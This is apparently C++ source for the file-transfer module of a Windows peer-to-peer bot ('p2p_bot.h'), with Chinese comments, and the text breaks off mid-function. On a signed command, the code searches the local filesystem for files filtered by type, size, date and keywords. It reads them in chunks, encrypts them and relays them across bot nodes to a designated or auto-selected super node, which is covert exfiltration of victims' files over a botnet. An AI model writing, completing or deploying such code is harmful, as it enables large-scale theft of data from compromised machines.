#include "p2p_bot.h"
#include <shlwapi.h>
#include <vector>
#include <string>
#include <map>
#include <set>

#pragma comment(lib, "shlwapi.lib")

#define MAX_CHUNK_SIZE 1024
#define MAX_HOPS 5  // 最大跳数限制，防止循环

// 使用extern全局变量
extern P2P_CORE g_p2p_core;
extern CRITICAL_SECTION g_nodes_cs;
extern P2P_NODE g_known_nodes[MAX_NODES];
extern unsigned int g_node_count;

// 全局已处理文件追踪（防止重复）
static std::set<std::string> g_processed_files;
static CRITICAL_SECTION g_processed_files_cs;

// File transfer session structure

static std::map<std::string, FILE_TRANSFER_SESSION> g_file_sessions;
static CRITICAL_SECTION g_sessions_cs;

// Initialize file transfer module
int file_transfer_init() {
    InitializeCriticalSection(&g_sessions_cs);
    InitializeCriticalSection(&g_processed_files_cs);

    // 验证结构体大小
    printf("[FileTransfer] ENHANCED_FILE_HEADER size: %zu bytes\n", sizeof(ENHANCED_FILE_HEADER));
    printf("[FileTransfer] NETWORK_MESSAGE data field size: %zu bytes\n", sizeof(((NETWORK_MESSAGE*)0)->data));

    if (sizeof(ENHANCED_FILE_HEADER) + MAX_CHUNK_SIZE > sizeof(((NETWORK_MESSAGE*)0)->data)) {
        printf("[FileTransfer] WARNING: Header + data may exceed buffer size\n");
    }

    printf("[FileTransfer] File transfer module initialized with size validation\n");
    return 1;
}

// Cleanup file transfer module
void file_transfer_cleanup() {
    DeleteCriticalSection(&g_sessions_cs);
    DeleteCriticalSection(&g_processed_files_cs);
    printf("[FileTransfer] File transfer module cleaned up\n");
}

// 检查文件是否已处理（防重复）
int is_file_already_processed(const char* file_id, const char* original_sender) {
    EnterCriticalSection(&g_processed_files_cs);

    std::string key = std::string(file_id) + "_" + std::string(original_sender);
    bool found = (g_processed_files.find(key) != g_processed_files.end());

    LeaveCriticalSection(&g_processed_files_cs);
    return found;
}

// 标记文件为已处理
void mark_file_processed(const char* file_id, const char* original_sender) {
    EnterCriticalSection(&g_processed_files_cs);

    std::string key = std::string(file_id) + "_" + std::string(original_sender);
    g_processed_files.insert(key);

    // 清理过期记录（1小时前）
    static time_t last_cleanup = 0;
    time_t current_time = time(NULL);
    if (current_time - last_cleanup > 3600) {
        g_processed_files.clear();
        last_cleanup = current_time;
    }

    LeaveCriticalSection(&g_processed_files_cs);
}
// 在文档3的file_transfer_init函数前添加以下函数

// 检查文件是否符合过滤条件
int is_file_match_criteria(const char* file_path, const FILE_TRANSFER_CMD* criteria) {
    if (!file_path || !criteria) return 0;

    WIN32_FILE_ATTRIBUTE_DATA file_info;
    if (!GetFileAttributesExA(file_path, GetFileExInfoStandard, &file_info)) {
        return 0;
    }

    // 检查文件大小
    ULARGE_INTEGER file_size;
    file_size.LowPart = file_info.nFileSizeLow;
    file_size.HighPart = file_info.nFileSizeHigh;

    if (criteria->min_size > 0 && file_size.QuadPart < criteria->min_size) {
        return 0;
    }
    if (criteria->max_size > 0 && file_size.QuadPart > criteria->max_size) {
        return 0;
    }

    // 检查文件类型
    if (strlen(criteria->file_types) > 0) {
        const char* extension = strrchr(file_path, '.');
        if (!extension) return 0;

        char types_copy[512];
        strcpy_s(types_copy, sizeof(types_copy), criteria->file_types);
        char* context = NULL;
        char* token = strtok_s(types_copy, ",", &context);
        int match_found = 0;

        while (token) {
            // 去除空格
            while (*token == ' ') token++;
            char* end = token + strlen(token) - 1;
            while (end > token && *end == ' ') *end-- = '\0';

            if (strcmp(token, "*.*") == 0 ||
                (strlen(token) > 1 && strcmp(extension, token) == 0)) {
                match_found = 1;
                break;
            }
            token = strtok_s(NULL, ",", &context);
        }

        if (!match_found) return 0;
    }

    // 检查时间范围
    if (strlen(criteria->time_range) > 0) {
        SYSTEMTIME file_time, start_time, end_time;
        FileTimeToSystemTime(&file_info.ftLastWriteTime, &file_time);

        // 解析时间范围 "2024-01-01:2024-12-31"
        char range_copy[64];
        strcpy_s(range_copy, sizeof(range_copy), criteria->time_range);
        char* separator = strchr(range_copy, ':');
        if (separator) {
            *separator = '\0';
            char* start_str = range_copy;
            char* end_str = separator + 1;

            sscanf_s(start_str, "%hu-%hu-%hu", &start_time.wYear, &start_time.wMonth, &start_time.wDay);
            sscanf_s(end_str, "%hu-%hu-%hu", &end_time.wYear, &end_time.wMonth, &end_time.wDay);

            // 比较时间
            ULONGLONG file_time_val = (file_time.wYear << 16) | (file_time.wMonth << 8) | file_time.wDay;
            ULONGLONG start_time_val = (start_time.wYear << 16) | (start_time.wMonth << 8) | start_time.wDay;
            ULONGLONG end_time_val = (end_time.wYear << 16) | (end_time.wMonth << 8) | end_time.wDay;

            if (file_time_val < start_time_val || file_time_val > end_time_val) {
                return 0;
            }
        }
    }

    return 1;
}

// 关键词搜索函数（简化版，实际使用时需要完整实现）
int file_contains_keywords(const char* file_path, const char* keywords) {
    if (!keywords || strlen(keywords) == 0) return 1; // 无关键词限制则通过

    // 这里简化实现，实际应该读取文件内容进行搜索
    // 为了安全，只检查文本文件或特定格式
    const char* ext = strrchr(file_path, '.');
    if (!ext) return 0;

    // 只对文本文件进行内容检查
    const char* text_exts[] = { ".txt", ".log", ".ini", ".xml", ".json", ".csv", NULL };
    int is_text_file = 0;
    for (int i = 0; text_exts[i]; i++) {
        if (_stricmp(ext, text_exts[i]) == 0) {
            is_text_file = 1;
            break;
        }
    }

    if (!is_text_file) return 1; // 非文本文件默认通过

    // 简化实现：只检查文件名是否包含关键词
    const char* filename = strrchr(file_path, '\\');
    if (!filename) filename = file_path;
    else filename++;

    char keywords_copy[512];
    strcpy_s(keywords_copy, sizeof(keywords_copy), keywords);
    char* context = NULL;
    char* token = strtok_s(keywords_copy, ",", &context);

    while (token) {
        if (strstr(filename, token) != NULL) {
            return 1;
        }
        token = strtok_s(NULL, ",", &context);
    }

    return 0;
}
// File transfer command handler
// 替换文档3中的file_transfer_handle_command函数
// 完整的 file_transfer_handle_command 函数
int file_transfer_handle_command(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result) {
    if (!cmd || !result) return 0;

    printf("[FileTransfer] Processing enhanced file transfer command\n");

    // 设置默认结果
    result->status = 1;
    result->execution_time = (unsigned int)get_timestamp();
    result->timestamp = get_timestamp();

    // 验证签名
    unsigned char sender_pub_key[PUBLIC_KEY_SIZE];
    unsigned char signature[SIGNATURE_SIZE];

    if (hex_decode(cmd->cmd_data.sender_pub_key, sender_pub_key, PUBLIC_KEY_SIZE) == PUBLIC_KEY_SIZE &&
        hex_decode(cmd->signature, signature, SIGNATURE_SIZE) == SIGNATURE_SIZE) {

        if (!crypto_verify(sender_pub_key, (unsigned char*)&cmd->cmd_data,
            sizeof(cmd->cmd_data), signature)) {
            printf("[FileTransfer] Command signature verification failed\n");
            strcpy_s(result->response, sizeof(result->response), "Signature verification failed");
            result->status = 0;
            return 0;
        }
    }

    // 解析增强的命令参数
    if (cmd->cmd_data.arg_count < 1) {
        printf("[FileTransfer] No arguments provided for file transfer command\n");
        strcpy_s(result->response, sizeof(result->response), "Invalid command format");
        result->status = 0;
        return 0;
    }

    FILE_TRANSFER_CMD enhanced_cmd;
    memset(&enhanced_cmd, 0, sizeof(enhanced_cmd));

    // 设置默认值
    enhanced_cmd.chunk_size = MAX_CHUNK_SIZE;
    enhanced_cmd.min_size = 0;
    enhanced_cmd.max_size = 100 * 1024 * 1024; // 默认100MB限制
    enhanced_cmd.max_file_count = 100;
    enhanced_cmd.include_subdirs = 1;

    // 解析增强参数格式
    char* args[20] = { 0 };
    int arg_count = 0;
    char args_copy[1024];
    strcpy_s(args_copy, sizeof(args_copy), cmd->cmd_data.args[0]);

    // 分号分隔的参数解析
    char* context = NULL;
    char* token = strtok_s(args_copy, ";", &context);
    while (token && arg_count < 20) {
        // 去除前后空格
        while (*token == ' ') token++;
        char* end = token + strlen(token) - 1;
        while (end > token && *end == ' ') *end-- = '\0';

        args[arg_count++] = token;
        token = strtok_s(NULL, ";", &context);
    }

    // 解析基本参数（保持向后兼容）
    if (arg_count >= 2) {
        strcpy_s(enhanced_cmd.file_pattern, sizeof(enhanced_cmd.file_pattern), args[0]);
        strcpy_s(enhanced_cmd.target_path, sizeof(enhanced_cmd.target_path), args[1]);

        if (arg_count >= 3) enhanced_cmd.chunk_size = atoi(args[2]);
        if (arg_count >= 4) strcpy_s(enhanced_cmd.relay_node_id, sizeof(enhanced_cmd.relay_node_id), args[3]);
        if (arg_count >= 5) strcpy_s(enhanced_cmd.final_target_id, sizeof(enhanced_cmd.final_target_id), args[4]);

        // 解析增强过滤参数
        if (arg_count >= 6) strcpy_s(enhanced_cmd.file_types, sizeof(enhanced_cmd.file_types), args[5]);
        if (arg_count >= 7) enhanced_cmd.min_size = _strtoui64(args[6], NULL, 10);
        if (arg_count >= 8) enhanced_cmd.max_size = _strtoui64(args[7], NULL, 10);
        if (arg_count >= 9) strcpy_s(enhanced_cmd.directory_filter, sizeof(enhanced_cmd.directory_filter), args[8]);
        if (arg_count >= 10) enhanced_cmd.max_file_count = atoi(args[9]);
        if (arg_count >= 11) strcpy_s(enhanced_cmd.time_range, sizeof(enhanced_cmd.time_range), args[10]);
        if (arg_count >= 12) strcpy_s(enhanced_cmd.content_keywords, sizeof(enhanced_cmd.content_keywords), args[11]);
        if (arg_count >= 13) enhanced_cmd.include_subdirs = atoi(args[12]);
        if (arg_count >= 14) strcpy_s(enhanced_cmd.priority_files, sizeof(enhanced_cmd.priority_files), args[13]);
    }
    else {
        printf("[FileTransfer] Invalid enhanced command format, expected at least 2 parameters\n");
        strcpy_s(result->response, sizeof(result->response), "Invalid enhanced command format");
        result->status = 0;
        return 0;
    }

    // 验证参数
    if (strlen(enhanced_cmd.file_pattern) == 0) {
        printf("[FileTransfer] File pattern is empty\n");
        strcpy_s(result->response, sizeof(result->response), "File pattern cannot be empty");
        result->status = 0;
        return 0;
    }

    // 验证文件大小限制
    if (enhanced_cmd.max_size > 500 * 1024 * 1024) { // 限制500MB
        enhanced_cmd.max_size = 500 * 1024 * 1024;
        printf("[FileTransfer] File size limit capped at 500MB\n");
    }

    printf("[FileTransfer] Enhanced command parsed: pattern=%s, types=%s, size=%llu-%llu, max_files=%d\n",
        enhanced_cmd.file_pattern, enhanced_cmd.file_types, enhanced_cmd.min_size,
        enhanced_cmd.max_size, enhanced_cmd.max_file_count);

    // 检测网络状态
    NETWORK_TYPE net_type;
    char public_ip[16] = { 0 };
    network_detect_connection_type(&net_type, public_ip);

    int transfer_result = 0;

    if (net_type == NET_TYPE_LAN_ONLY || net_type == NET_TYPE_NONE) {
        // 需要中继节点
        if (strlen(enhanced_cmd.relay_node_id) == 0) {
            printf("[FileTransfer] No relay node specified for LAN-only node\n");

            // 尝试查找可用中继节点（排除自己）
            EnterCriticalSection(&g_nodes_cs);
            for (unsigned int i = 0; i < g_node_count; i++) {
                if (g_known_nodes[i].state == NODE_STATE_ONLINE &&
                    strcmp(g_known_nodes[i].node_id, cmd->cmd_data.sender_pub_key) != 0) {
                    strcpy_s(enhanced_cmd.relay_node_id, sizeof(enhanced_cmd.relay_node_id),
                        g_known_nodes[i].node_id);
                    break;
                }
            }
            LeaveCriticalSection(&g_nodes_cs);
        }

        if (strlen(enhanced_cmd.relay_node_id) > 0 && strlen(enhanced_cmd.final_target_id) > 0) {
            transfer_result = file_transfer_send_file_enhanced(&g_p2p_core, &enhanced_cmd,
                cmd->cmd_data.sender_pub_key);
        }
        else {
            printf("[FileTransfer] No available relay nodes or final target found\n");
        }
    }
    else {
        // 本节点可以直接发送
        if (strlen(enhanced_cmd.final_target_id) > 0) {
            printf("[FileTransfer] This node can connect to WAN, sending directly to target\n");
            transfer_result = file_transfer_send_file_enhanced(&g_p2p_core, &enhanced_cmd,
                cmd->cmd_data.sender_pub_key);
        }
        else {
            printf("[FileTransfer] No final target specified\n");
        }
    }

    if (transfer_result) {
        strcpy_s(result->response, sizeof(result->response), "Enhanced file transfer command accepted");
        printf("[FileTransfer] Enhanced file transfer command processed successfully\n");
    }
    else {
        strcpy_s(result->response, sizeof(result->response), "Enhanced file transfer command failed");
        result->status = 0;
        printf("[FileTransfer] Enhanced file transfer command processing failed\n");
    }

    return 1;
}

// 增强的文件发送函数（带防循环控制）
// 替换文档3中的file_transfer_send_file_with_target函数
// 修复的文件发送函数
int file_transfer_send_file_enhanced(P2P_CORE* core, const FILE_TRANSFER_CMD* cmd,
    const char* original_sender) {
    if (!core || !cmd || !original_sender) return 0;

    WIN32_FIND_DATAA find_data;
    HANDLE hFind;
    char search_path[MAX_PATH];
    char search_dir[MAX_PATH];

    // 构建搜索路径
    if (strchr(cmd->file_pattern, '*') || strchr(cmd->file_pattern, '?')) {
        strcpy_s(search_path, sizeof(search_path), cmd->file_pattern);

        // 提取目录部分
        char* last_slash = strrchr(search_path, '\\');
        if (last_slash) {
            *last_slash = '\0';
            strcpy_s(search_dir, sizeof(search_dir), search_path);
            *last_slash = '\\'; // 恢复
        }
        else {
            strcpy_s(search_dir, sizeof(search_dir), ".\\");
        }
    }
    else {
        // 单个文件
        strcpy_s(search_path, sizeof(search_path), cmd->file_pattern);
        char* last_slash = strrchr(search_path, '\\');
        if (last_slash) {
            *last_slash = '\0';
            strcpy_s(search_dir, sizeof(search_dir), search_path);
            *last_slash = '\\';
        }
        else {
            strcpy_s(search_dir, sizeof(search_dir), ".\\");
        }
    }

    printf("[FileTransfer] Enhanced search in: %s, pattern: %s\n", search_dir, cmd->file_pattern);

    hFind = FindFirstFileA(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[FileTransfer] No files found matching pattern: %s\n", cmd->file_pattern);
        return 0;
    }

    int files_sent = 0;
    std::vector<HANDLE> open_files;
    std::vector<unsigned char*> allocated_buffers;

    do {
        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char file_path[MAX_PATH];

            if (strchr(cmd->file_pattern, '*') || strchr(cmd->file_pattern, '?')) {
                char* last_slash = strrchr(search_path, '\\');
                if (last_slash) {
                    strcpy_s(file_path, sizeof(file_path), search_dir);
                    strcat_s(file_path, sizeof(file_path), "\\");
                    strcat_s(file_path, sizeof(file_path), find_data.cFileName);
                }
                else {
                    strcpy_s(file_path, sizeof(file_path), find_data.cFileName);
                }
            }
            else {
                strcpy_s(file_path, sizeof(file_path), cmd->file_pattern);
            }

            // 应用过滤条件
            if (is_file_match_criteria(file_path, cmd)) {
                // 生成文件ID
                char file_id[37];
                generate_message_id(file_id);

                // 检查是否已处理（防重复）
                if (is_file_already_processed(file_id, original_sender)) {
                    printf("[FileTransfer] File already processed: %s, skipping\n", file_path);
                    continue;
                }

                printf("[FileTransfer] Sending enhanced file: %s to relay: %s, final target: %s\n",
                    file_path, cmd->relay_node_id, cmd->final_target_id);

                // 打开文件
                HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile == INVALID_HANDLE_VALUE) {
                    printf("[FileTransfer] Failed to open file: %s\n", file_path);
                    continue;
                }
                open_files.push_back(hFile);

                // 获取文件大小
                DWORD file_size = GetFileSize(hFile, NULL);
                if (file_size == INVALID_FILE_SIZE) {
                    printf("[FileTransfer] Failed to get file size: %s\n", file_path);
                    CloseHandle(hFile);
                    continue;
                }

                // 计算分片数
                unsigned int total_chunks = (file_size + cmd->chunk_size - 1) / cmd->chunk_size;

                // 分配缓冲区
                unsigned char* buffer = new (std::nothrow) unsigned char[cmd->chunk_size];
                if (!buffer) {
                    printf("[FileTransfer] Memory allocation failed for chunk buffer\n");
                    CloseHandle(hFile);
                    continue;
                }
                allocated_buffers.push_back(buffer);

                DWORD bytes_read;
                unsigned int chunk_index = 0;
                int read_success = 1;

                while (read_success && chunk_index < total_chunks) {
                    if (!ReadFile(hFile, buffer, cmd->chunk_size, &bytes_read, NULL) || bytes_read == 0) {
                        read_success = 0;
                        break;
                    }

                    // 构建增强的文件分片消息
                    NETWORK_MESSAGE chunk_msg;
                    memset(&chunk_msg, 0, sizeof(NETWORK_MESSAGE));

                    generate_message_id(chunk_msg.message_id);
                    strcpy_s(chunk_msg.sender_id, sizeof(chunk_msg.sender_id), core->node_id);
                    strcpy_s(chunk_msg.recipient_id, sizeof(chunk_msg.recipient_id), cmd->relay_node_id);
                    chunk_msg.message_type = FILE_CHUNK;
                    chunk_msg.timestamp = get_timestamp();
                    chunk_msg.encrypted = 1;

                    // 构建修复后的增强文件头
                    ENHANCED_FILE_HEADER enhanced_header;
                    memset(&enhanced_header, 0, sizeof(ENHANCED_FILE_HEADER));

                    // 填充基础头信息
                    strcpy_s(enhanced_header.base_header.file_id, sizeof(enhanced_header.base_header.file_id), file_id);

                    // 提取文件名
                    const char* filename = strrchr(file_path, '\\');
                    if (filename) filename++;
                    else filename = file_path;
                    strcpy_s(enhanced_header.base_header.file_name, sizeof(enhanced_header.base_header.file_name), filename);

                    enhanced_header.base_header.file_size = file_size;
                    enhanced_header.base_header.total_chunks = total_chunks;
                    enhanced_header.base_header.chunk_index = chunk_index;
                    enhanced_header.base_header.chunk_size = bytes_read;
                    strcpy_s(enhanced_header.base_header.sender_id, sizeof(enhanced_header.base_header.sender_id), core->node_id);
                    strcpy_s(enhanced_header.base_header.recipient_id, sizeof(enhanced_header.base_header.recipient_id), cmd->relay_node_id);

                    // 填充增强信息（简化版）
                    strcpy_s(enhanced_header.final_target_id, sizeof(enhanced_header.final_target_id), cmd->final_target_id);
                    strcpy_s(enhanced_header.original_sender_id, sizeof(enhanced_header.original_sender_id), original_sender);
                    enhanced_header.hop_count = 0;

                    // 只复制关键过滤参数
                    strcpy_s(enhanced_header.file_types, sizeof(enhanced_header.file_types), cmd->file_types);
                    enhanced_header.min_size = cmd->min_size;
                    enhanced_header.max_size = cmd->max_size;
                    enhanced_header.max_files = cmd->max_file_count;

                    // 检查数据大小是否超过限制
                    size_t header_size = sizeof(ENHANCED_FILE_HEADER);
                    size_t total_data_size = header_size + bytes_read;

                    if (total_data_size > sizeof(chunk_msg.data)) {
                        printf("[FileTransfer] Data too large: %zu > %zu, truncating\n",
                            total_data_size, sizeof(chunk_msg.data));
                        bytes_read = sizeof(chunk_msg.data) - header_size;
                    }

                    // 复制到消息数据区
                    memcpy(chunk_msg.data, &enhanced_header, header_size);
                    memcpy(chunk_msg.data + header_size, buffer, bytes_read);
                    chunk_msg.data_size = (unsigned int)(header_size + bytes_read);

                    // 加密消息
                    unsigned char encrypted_data[MAX_PACKET_SIZE];
                    unsigned int encrypted_size = sizeof(encrypted_data);

                    if (crypto_encrypt(&core->crypto_ctx, chunk_msg.data, chunk_msg.data_size,
                        encrypted_data, &encrypted_size)) {
                        // 检查加密后的大小
                        if (encrypted_size <= sizeof(chunk_msg.data)) {
                            memcpy(chunk_msg.data, encrypted_data, encrypted_size);
                            chunk_msg.data_size = encrypted_size;

                            // 发送到中继节点
                            int send_result = p2p_broadcast_message(core, &chunk_msg);
                            if (send_result) {
                                printf("[FileTransfer] Chunk %u/%u sent successfully\n",
                                    chunk_index + 1, total_chunks);
                            }
                            else {
                                printf("[FileTransfer] Failed to send chunk %u\n", chunk_index + 1);
                            }
                        }
                        else {
                            printf("[FileTransfer] Encrypted data too large: %u > %zu\n",
                                encrypted_size, sizeof(chunk_msg.data));
                        }
                    }
                    else {
                        printf("[FileTransfer] Encryption failed for chunk %u\n", chunk_index + 1);
                    }

                    chunk_index++;
                    Sleep(10); // 防止洪泛
                }

                // 标记文件为已处理
                mark_file_processed(file_id, original_sender);
                files_sent++;
                printf("[FileTransfer] Enhanced file sent successfully: %s (%u chunks)\n",
                    file_path, total_chunks);

                // 检查文件数量限制
                if (files_sent >= cmd->max_file_count) {
                    printf("[FileTransfer] Reached maximum file count limit: %d\n", cmd->max_file_count);
                    break;
                }

                CloseHandle(hFile);
            }
        }
    } while (FindNextFileA(hFind, &find_data) && files_sent < cmd->max_file_count);

    FindClose(hFind);

    // 清理资源
    for (size_t i = 0; i < allocated_buffers.size(); i++) {
        if (allocated_buffers[i]) {
            delete[] allocated_buffers[i];
        }
    }

    printf("[FileTransfer] Total enhanced files sent: %d\n", files_sent);
    return files_sent > 0;
}

// 处理文件传输消息
// 修复 p2p_handle_file_transfer 函数
void p2p_handle_file_transfer(P2P_CORE* core, const NETWORK_MESSAGE* msg) {
    if (!core || !msg) return;

    NETWORK_MESSAGE processed_msg = *msg;

    // 解密消息
    if (msg->encrypted) {
        unsigned char decrypted_data[MAX_PACKET_SIZE];
        unsigned int decrypted_size = MAX_PACKET_SIZE;

        if (crypto_decrypt(&core->crypto_ctx, msg->data, msg->data_size,
            decrypted_data, &decrypted_size)) {
            memcpy(processed_msg.data, decrypted_data, decrypted_size);
            processed_msg.data_size = decrypted_size;
        }
        else {
            printf("[FileTransfer] Failed to decrypt message\n");
            return;
        }
    }

    // 处理文件分片消息
    if (processed_msg.message_type == FILE_CHUNK) {
        // 检查数据大小是否足够
        if (processed_msg.data_size >= sizeof(ENHANCED_FILE_HEADER)) {
            ENHANCED_FILE_HEADER enhanced_header;
            memcpy(&enhanced_header, processed_msg.data, sizeof(ENHANCED_FILE_HEADER));

            // 检查跳数限制
            if (enhanced_header.hop_count >= MAX_HOPS) {
                printf("[FileTransfer] Max hops exceeded for file %s, dropping\n",
                    enhanced_header.base_header.file_id);
                return;
            }

            // 检查是否目标节点
            if (strcmp(enhanced_header.base_header.recipient_id, core->node_id) == 0) {
                printf("[FileTransfer] Received file chunk for this node: %s, chunk %u/%u, hop=%d\n",
                    enhanced_header.base_header.file_name,
                    enhanced_header.base_header.chunk_index + 1,
                    enhanced_header.base_header.total_chunks,
                    enhanced_header.hop_count);

                // 调用增强的中继函数
                file_transfer_relay_file_enhanced(core, &enhanced_header,
                    processed_msg.data + sizeof(ENHANCED_FILE_HEADER),
                    processed_msg.data_size - sizeof(ENHANCED_FILE_HEADER));
            }
            else {
                printf("[FileTransfer] File chunk not for this node, recipient: %s\n",
                    enhanced_header.base_header.recipient_id);
            }
        }
        else {
            printf("[FileTransfer] Invalid file chunk message size: %u < %zu\n",
                processed_msg.data_size, sizeof(ENHANCED_FILE_HEADER));
        }
    }
}

// 增强的中继文件处理函数（带防循环控制）
// 修复 file_transfer_relay_file_enhanced 函数
int file_transfer_relay_file_enhanced(P2P_CORE* core, void* enhanced_header_ptr,
    const unsigned char* data, unsigned int data_size) {

    if (!core || !enhanced_header_ptr || !data) return 0;

    // 使用修复后的结构体定义
    ENHANCED_FILE_HEADER* enhanced_header = (ENHANCED_FILE_HEADER*)enhanced_header_ptr;

    // 检查是否已处理（防重复）
    if (is_file_already_processed(enhanced_header->base_header.file_id,
        enhanced_header->original_sender_id)) {
        printf("[FileTransfer] File already processed: %s, dropping\n",
            enhanced_header->base_header.file_id);
        return 0;
    }

    EnterCriticalSection(&g_sessions_cs);

    // 查找或创建文件会话
    std::string file_id_str(enhanced_header->base_header.file_id);
    auto it = g_file_sessions.find(file_id_str);

    if (it == g_file_sessions.end()) {
        // 创建新会话
        FILE_TRANSFER_SESSION new_session;
        strcpy_s(new_session.file_id, sizeof(new_session.file_id), enhanced_header->base_header.file_id);
        strcpy_s(new_session.file_name, sizeof(new_session.file_name), enhanced_header->base_header.file_name);
        new_session.file_size = enhanced_header->base_header.file_size;
        new_session.total_chunks = enhanced_header->base_header.total_chunks;
        new_session.received_chunks = 0;
        new_session.last_activity = time(NULL);
        strcpy_s(new_session.original_sender_id, sizeof(new_session.original_sender_id),
            enhanced_header->original_sender_id);
        strcpy_s(new_session.final_target_id, sizeof(new_session.final_target_id),
            enhanced_header->final_target_id);
        new_session.hop_count = enhanced_header->hop_count;

        // 记录路径
        new_session.path_taken.push_back(core->node_id);

        g_file_sessions[file_id_str] = new_session;
        it = g_file_sessions.find(file_id_str);

        printf("[FileTransfer] Started new file session: %s, final target: %s, hop=%d\n",
            enhanced_header->base_header.file_name, enhanced_header->final_target_id,
            enhanced_header->hop_count);
    }

    FILE_TRANSFER_SESSION& session = it->second;

    // 验证分片索引
    if (enhanced_header->base_header.chunk_index >= session.total_chunks) {
        printf("[FileTransfer] Invalid chunk index: %u >= %u\n",
            enhanced_header->base_header.chunk_index, session.total_chunks);
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    // 检查分片是否已接收
    if (enhanced_header->base_header.chunk_index < session.chunks.size() &&
        !session.chunks[enhanced_header->base_header.chunk_index].empty()) {
        printf("[FileTransfer] Chunk %u already received\n", enhanced_header->base_header.chunk_index);
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    // 存储分片
    if (session.chunks.size() <= enhanced_header->base_header.chunk_index) {
        session.chunks.resize(enhanced_header->base_header.chunk_index + 1);
    }

    // 只存储实际文件数据（不包括头）
    unsigned int data_offset = sizeof(ENHANCED_FILE_HEADER);
    if (data_size > data_offset) {
        unsigned int actual_data_size = data_size - data_offset;
        session.chunks[enhanced_header->base_header.chunk_index] =
            std::vector<unsigned char>(data + data_offset, data + data_size);
    }
    else {
        printf("[FileTransfer] Invalid data size: %u, header size: %zu\n",
            data_size, sizeof(ENHANCED_FILE_HEADER));
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    session.received_chunks++;
    session.last_activity = time(NULL);

    printf("[FileTransfer] Received chunk %u/%u for file: %s\n",
        session.received_chunks, session.total_chunks, session.file_name);

    // 检查是否所有分片都已接收
    if (session.received_chunks == session.total_chunks) {
        printf("[FileTransfer] All chunks received, reassembling file: %s\n", session.file_name);

        // 重组文件
        std::vector<unsigned char> file_data;
        for (unsigned int i = 0; i < session.total_chunks; i++) {
            if (i < session.chunks.size() && !session.chunks[i].empty()) {
                file_data.insert(file_data.end(),
                    session.chunks[i].begin(), session.chunks[i].end());
            }
            else {
                printf("[FileTransfer] Missing chunk %u, file reassembly failed\n", i);
                LeaveCriticalSection(&g_sessions_cs);
                return 0;
            }
        }

        // 创建临时文件
        char temp_path[MAX_PATH];
        if (GetTempPathA(MAX_PATH, temp_path)) {
            char file_path[MAX_PATH];
            sprintf_s(file_path, sizeof(file_path), "%s\\relay_%s", temp_path, session.file_name);

            HANDLE hFile = CreateFileA(file_path, GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD bytes_written;
                WriteFile(hFile, file_data.data(), (DWORD)file_data.size(),
                    &bytes_written, NULL);
                CloseHandle(hFile);

                printf("[FileTransfer] File reassembled successfully: %s (%zu bytes)\n",
                    file_path, file_data.size());

                // 标记文件为已处理
                mark_file_processed(session.file_id, session.original_sender_id);

                // 转发文件到最终目标
                int forward_result = forward_file_to_final_target(core, file_path, &session);

                // 清理临时文件
                DeleteFileA(file_path);

                // 清理会话
                g_file_sessions.erase(it);
                LeaveCriticalSection(&g_sessions_cs);

                return forward_result;
            }
        }

        printf("[FileTransfer] Failed to create temporary file for reassembly\n");
        g_file_sessions.erase(it);
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    LeaveCriticalSection(&g_sessions_cs);
    return 1;
}

// 转发文件到最终目标（带防循环控制）
// 修复 forward_file_to_final_target 函数
int forward_file_to_final_target(P2P_CORE* core, const char* file_path, FILE_TRANSFER_SESSION* session) {
    if (!core || !file_path || !session) return 0;

    // 检查跳数限制
    if (session->hop_count >= MAX_HOPS) {
        printf("[FileTransfer] Max hop count reached for file %s, stopping forward\n", session->file_id);
        return 0;
    }

    char target_node_id[NODE_ID_STRING_SIZE + 1] = { 0 };

    // 确定目标节点
    if (strlen(session->final_target_id) > 0) {
        // 使用指定的最终目标
        strcpy_s(target_node_id, sizeof(target_node_id), session->final_target_id);

        // 检查是否目标是自己（防止循环）
        if (strcmp(target_node_id, core->node_id) == 0) {
            printf("[FileTransfer] Final target is myself, file delivery completed: %s\n", session->file_id);
            return 1; // 文件已到达最终目标
        }

        printf("[FileTransfer] Forwarding to specified final target: %s\n", target_node_id);
    }
    else {
        // 自动选择超级节点作为最终目标
        EnterCriticalSection(&g_nodes_cs);
        for (unsigned int i = 0; i < g_node_count; i++) {
            if (g_known_nodes[i].state == NODE_STATE_ONLINE &&
                g_known_nodes[i].node_type == NODE_TYPE_SUPER &&
                strcmp(g_known_nodes[i].node_id, core->node_id) != 0 && // 不选自己
                strcmp(g_known_nodes[i].node_id, session->original_sender_id) != 0) { // 不选原始发送者

                strcpy_s(target_node_id, sizeof(target_node_id), g_known_nodes[i].node_id);
                printf("[FileTransfer] Auto-selected super node as final target: %s\n", target_node_id);
                break;
            }
        }
        LeaveCriticalSection(&g_nodes_cs);
    }

    if (strlen(target_node_id) == 0) {
        printf("[FileTransfer] No suitable final target found\n");
        return 0;
    }

    // 检查路径循环：确保目标节点不在已走过的路径中
    for (const auto& path_node : session->path_taken) {
        if (path_node == target_node_id) {
            printf("[FileTransfer] Detected path loop, target node %s already visited\n", target_node_id);
            return 0;
        }
    }

    // 检查是否目标节点在线
    int target_online = 0;
    EnterCriticalSection(&g_nodes_cs);
    for (unsigned int i = 0; i < g_node_count; i++) {
        if (strcmp(g_known_nodes[i].node_id, target_node_id) == 0 &&
            g_known_nodes[i].state == NODE_STATE_ONLINE) {
            target_online = 1;
            break;
        }
    }
    LeaveCriticalSection(&g_nodes_cs);

    if (!target_online) {
        printf("[FileTransfer] Target node %s is not online\n", target_node_id);
        return 0;
    }

    // 增加跳数并记录路径
    session->hop_count++;
    session->path_taken.push_back(core->node_id);

    printf("[FileTransfer] Forwarding file to final target: %s (hop %d/%d)\n",
        target_node_id, session->hop_count, MAX_HOPS);

    // 发送文件到最终目标
    int result = file_transfer_send_file_with_target_enhanced(core, file_path,
        target_node_id, target_node_id, MAX_CHUNK_SIZE,
        session->original_sender_id, session->hop_count);

    if (result) {
